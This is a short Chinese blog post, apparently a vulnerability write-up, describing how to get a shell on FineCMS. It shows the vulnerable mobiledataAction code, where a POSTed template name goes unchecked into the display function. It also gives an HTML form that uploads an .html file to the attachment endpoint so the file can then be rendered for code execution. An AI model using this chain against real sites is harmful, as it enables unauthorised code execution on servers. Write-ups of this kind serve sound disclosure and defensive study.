---
layout: post
title:  "finecms getshell"
date:   2017-03-3 10:11:51
comments: true
categories: php bug
---

##finecms getshell

/controllers/ApiController.php    159行

此处通过post方式获取然后直接放入函数渲染导致代码执行

//this->view->display 

不过最终display 函数发现会在后面加上一个.html ， 不过我们可以上传一个html文件就可以执行了




```javascript

 public function mobiledataAction() {

        $tpl = $this->post('tpl');//模板

        $page = $this->post('page');//数据分页

        $catid = $this->post('catid');//栏目id

        $this->view->assign(array(

            'page'  => $page + 1,

            'catid' => $catid

        ));

        $this->view->display($tpl);

    }


```
    <form action="http://192.168.173.1/fine/index.php?c=attachment&a=ajaxswfupload" method="POST" enctype="multipart/form-data">

        <input type="file" name="Filedata">

        <input type="hidden" name="type" value="html">

        <input type="hidden" name="size" value="999">

        <input type="submit" name="submit" value="submit">


上传一个html , 然后将其渲染就执行了。


![rock](https://striker.teambition.net/thumbnail/110re6c73e490423717fc74fbb2e8b0b2e17/w/800/h/567)



